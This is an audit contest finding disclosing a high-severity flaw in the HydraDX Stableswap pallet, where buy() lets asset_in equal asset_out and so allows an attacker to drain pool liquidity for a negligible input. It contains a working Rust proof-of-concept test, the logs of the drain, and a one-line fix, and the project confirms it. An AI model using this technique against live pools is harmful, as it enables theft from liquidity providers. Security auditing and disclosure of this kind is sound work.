[H-01] An attacker possesses the capability to exhaust the entirety of liquidity within the stable swap pools by manipulating the buy function, specifically by setting theasset_inparameter equal to theasset_outparameter
Submitted bycastle_chain, also found bybin2chen
https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L787-L842https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L40-L41
Impact
This vulnerability has been identified in the Stableswap pallet that could potentially drain all liquidity from all pools without any permissions. This vulnerability can be exploited by malicious actors, resulting in significant financial losses for both the protocol and liquidity providers.
Proof of Concept
The vulnerability lies in thebuy()function, which can be exploited by settingasset_into an asset already present in the pool and subsequently settingasset_outto the same asset. The function does not validate or prevent this input, allowing an attacker to receive the entire amount_outwithout providing any correspondingamount_in.
Attack Flow:
The attacker calls the functionbuyand specifies theasset_inequal toasset_out, the function has no check that prevents this input to be passed.The function will calculate theamount_inthat should be taken out from the user, so the function will usecalculate_in_amountfunction as shownherethis function will callcalculate_in_given_out_with_fee()function.
let(amount_in, fee_amount) =Self::calculate_in_amount(pool_id, asset_in, asset_out, amount_out)?;
The functioncalculate_in_given_out_with_feeherewill call the functioncalculate_in_given_outto calculateamount_in, and the finalamount_inwill be the amount calculated plus the fees,  and the fees are calculated as the ratio of theamount_in.In the functioncalculate_in_given_out, since theasset_inis equal toasset_outthen thenew_reserve_inwill be equal to the old reservereserves[idx_in]. Therefore, theamount_in, which is the difference between the new and the old reserves, will be equal to zeroas shownhere, and then the function will add 1 to theamount_in.
letnew_reserve_in =calculate_y_given_out::<D, Y>(amount_out, idx_in, idx_out, &reserves, amplification)?;letamount_in = new_reserve_in.checked_sub(reserves[idx_in])?;letamount_in =normalize_value(amount_in,TARGET_PRECISION,initial_reserves[idx_in].decimals,Rounding::Up,);Some(amount_in.saturating_add(1u128))
This will result inamount_in = 1and with the fee, it will be equal toamount_in = 1.001.
If the attacker setamount_out = 100_000_000_000_000he will take them and only payamount_in = 1.001.
Coded POC to demonstrate the vulnerability
Consider add this test into the test filetrade.rshere, and see the logs resulted from this test:
#[test]fntest_set_asset_in_equal_asset_out_will_be_profitable() {letasset_a: AssetId =1;letasset_b: AssetId =2;letdec_a:u8=18;letdec_b:u8=6;ExtBuilder::default().with_endowed_accounts(vec![(BOB, asset_a,to_precision!(200, dec_a)),(ALICE, asset_a,to_precision!(200, dec_a)),(ALICE, asset_b,to_precision!(200, dec_b)),]).with_registered_asset("one".as_bytes().to_vec(),1, dec_a).with_registered_asset("two".as_bytes().to_vec(),2, dec_b).with_pool(ALICE,PoolInfo::<AssetId,u64> {assets:vec![asset_a, asset_b].try_into().unwrap(),initial_amplification: NonZeroU16::new(100).unwrap(),final_amplification: NonZeroU16::new(100).unwrap(),initial_block:0,final_block:0,fee: Permill::from_float(0.01),},InitialLiquidity {account: ALICE,assets:vec![AssetAmount::new(asset_a,to_precision!(100, dec_a)),AssetAmount::new(asset_b,to_precision!(100, dec_b)),],},).build().execute_with(|| {letpool_id =get_pool_id_at(0);letpool_account =pool_account(pool_id);letasset_a_state_before = Tokens::free_balance(asset_a, &pool_account);letbalance_before = Tokens::free_balance(asset_a, &BOB);for_in0..5{assert_ok!(Stableswap::buy(RuntimeOrigin::signed(BOB),pool_id,asset_a,asset_a,to_precision!(20, dec_a),to_precision!(31, dec_a),));}letasset_a_state_after = Tokens::free_balance(asset_a, &pool_account);// the user here received the fees// 229_999_999_999_999_999_994letbalance_after = Tokens::free_balance(asset_a, &BOB);println!("pool balance of asset a before the attack = {:?} ",asset_a_state_before);println!("pool balance of asset a after the attack  = {:?} ", asset_a_state_after);println!("balance of bob before the attack = {:?}", balance_before);println!(" balance of asset a owned by bob after the attack =  {:?}", balance_after);println!(" the amount of profit for BOB: {:?}", balance_after - balance_before);});}
The logs will be:
running1testpool balance of asset a before the attack =100000000000000000000pool balance of asset a after the attack  =28balance of bob before the attack =200000000000000000000balance of asset a owned by bob after the attack =299999999999999999972the amount of profitforBOB:99999999999999999972
As shown here, Bob can drain almost all the liquidity ofasset_ain the pool, and he can repeat this attack to drain all the assets exists in all the pools.
Recommended Mitigation Steps
To mitigate this vulnerability, it is crucial to prevent the setting ofasset_inequal toasset_out. This can be achieved by adding the following line to thebuy()function:
pub fn buy(origin: OriginFor<T>,pool_id: T::AssetId,asset_out: T::AssetId,asset_in: T::AssetId,amount_out: Balance,max_sell_amount: Balance,) -> DispatchResult {let who = ensure_signed(origin)?;+                        ensure!(+                 asset_out != asset_in, Error::<T>::Invalid+                );
Integrating this check into thebuy()function will effectively prevent attackers from draining liquidity from the pool.
Assessed type
Invalid Validation
enthusiastmartin (HydraDX) confirmed and commented:
Nice one!